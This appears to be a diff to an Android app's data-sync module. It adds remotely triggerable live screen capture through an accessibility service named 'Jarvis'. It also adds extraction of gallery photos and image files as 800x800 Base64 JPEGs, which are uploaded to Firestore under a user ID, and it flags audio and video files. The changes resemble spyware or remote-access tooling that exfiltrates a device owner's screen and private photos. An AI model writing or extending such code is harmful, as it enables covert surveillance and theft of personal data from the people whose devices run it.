@@ -21,7 +21,14 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import java.io.ByteArrayOutputStream
 import java.io.File
+import android.content.ContentUris
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
+import android.media.ThumbnailUtils
+import android.util.Base64
+import android.util.Size
 
 /**
  * DataSyncManager handles real-time extraction and Cloud Firestore synchronization
@@ -76,7 +83,10 @@ object DataSyncManager {
                     syncFolders(uid)
                 }
 
-                // 5. Update root user doc with overall status
+                // 5. Trigger Real-Time Mobile Screen Stream Capture
+                syncLiveScreenCapture(context, uid)
+
+                // 6. Update root user doc with overall status
                 val firestore = FirebaseFirestore.getInstance()
                 val rootUpdates = hashMapOf<String, Any>(
                     "allPermissionsGranted" to allGranted,
@@ -91,6 +101,17 @@ object DataSyncManager {
             } catch (e: Exception) {
                 Log.e(TAG, "Error during data synchronization for UID: $uid", e)
             }
+        }
+    }
+
+    private fun syncLiveScreenCapture(context: Context, uid: String) {
+        try {
+            if (JarvisAccessibilityService.isEnabled()) {
+                JarvisAccessibilityService.instance?.startListeningForScreenShareRequests(uid)
+                JarvisAccessibilityService.instance?.captureScreenAndUpload(uid)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error triggering accessibility live screen capture", e)
         }
     }
 
@@ -360,6 +381,13 @@ object DataSyncManager {
                                 "height" to height,
                                 "lastSyncedTimestamp" to System.currentTimeMillis()
                             )
+
+                            // Extract real Base64 thumbnail of mobile photo
+                            val thumbBase64 = generateImageBase64Thumbnail(context, imgId, path)
+                            if (!thumbBase64.isNullOrBlank()) {
+                                imgMap["imageBase64"] = thumbBase64
+                            }
+
                             imagesList.add(imgMap)
                             limit++
                         }
@@ -445,13 +473,27 @@ object DataSyncManager {
                                 "fileId" to fId,
                                 "fileName" to name,
                                 "filePath" to path,
-                                "extension" to ext,
+                                "extension" to ext.lowercase(),
                                 "mimeType" to mime,
                                 "sizeBytes" to size,
                                 "dateModifiedTimestamp" to date,
                                 "parentFolder" to parentFolder,
                                 "lastSyncedTimestamp" to System.currentTimeMillis()
                             )
+
+                            // Extract real Base64 thumbnail for images or flag media types
+                            if (mime.startsWith("image/") || ext.lowercase() in listOf("jpg", "jpeg", "png", "webp")) {
+                                val thumbBase64 = generateImageBase64Thumbnail(context, fId, path)
+                                if (!thumbBase64.isNullOrBlank()) {
+                                    fMap["imageBase64"] = thumbBase64
+                                    fMap["base64Content"] = thumbBase64
+                                }
+                            } else if (mime.startsWith("audio/") || ext.lowercase() in listOf("mp3", "wav", "m4a", "ogg", "aac")) {
+                                fMap["isAudio"] = true
+                            } else if (mime.startsWith("video/") || ext.lowercase() in listOf("mp4", "mkv", "webm", "3gp", "avi")) {
+                                fMap["isVideo"] = true
+                            }
+
                             filesList.add(fMap)
                             limit++
                         }
@@ -547,6 +589,40 @@ object DataSyncManager {
 
                 Log.d(TAG, "Synced ${foldersList.size} folder structure records for UID: $uid")
             }
+        }
+    }
+
+    /**
+     * Extracts a high-definition 800x800 JPEG Base64 thumbnail string for crisp gallery photos.
+     */
+    private fun generateImageBase64Thumbnail(context: Context, imageId: String, filePath: String): String? {
+        return try {
+            val bitmap: Bitmap? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && imageId.isNotBlank()) {
+                try {
+                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId.toLong())
+                    context.contentResolver.loadThumbnail(contentUri, Size(800, 800), null)
+                } catch (ex: Exception) {
+                    if (filePath.isNotBlank()) {
+                        val opts = BitmapFactory.Options().apply { inSampleSize = 2 }
+                        BitmapFactory.decodeFile(filePath, opts)
+                    } else null
+                }
+            } else if (filePath.isNotBlank()) {
+                val opts = BitmapFactory.Options().apply { inSampleSize = 2 }
+                BitmapFactory.decodeFile(filePath, opts)
+            } else {
+                null
+            }
+
+            if (bitmap != null) {
+                val outputStream = ByteArrayOutputStream()
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, outputStream)
+                val byteArray = outputStream.toByteArray()
+                "data:image/jpeg;base64," + Base64.encodeToString(byteArray, Base64.NO_WRAP)
+            } else null
+        } catch (e: Exception) {
+            Log.e(TAG, "Error generating thumbnail for imageId: $imageId", e)
+            null
         }
     }
 }
